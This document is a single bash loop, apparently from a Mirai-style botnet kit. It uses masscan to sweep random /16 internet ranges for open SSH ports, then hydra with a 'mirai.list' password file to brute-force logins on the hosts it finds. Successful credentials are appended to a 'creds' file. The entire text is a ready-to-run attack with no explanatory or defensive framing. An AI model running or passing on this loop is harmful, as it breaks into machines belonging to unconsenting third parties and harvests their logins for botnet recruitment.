while true; do sudo ./busybox masscan --rate 6000 -p 22 $(./busybox randip)/16| grep Discovered | cut -d' ' -f 6 > ips ; ./busybox hydra -e nsr -v   -M ips -C mirai.list -t 64 ssh | tee -a hlog ; > ips  ; grep '\[ssh\]' hlog | tr -s ' ' | cut -d' ' -f 3,5,7 >> creds ; > hlog ; done



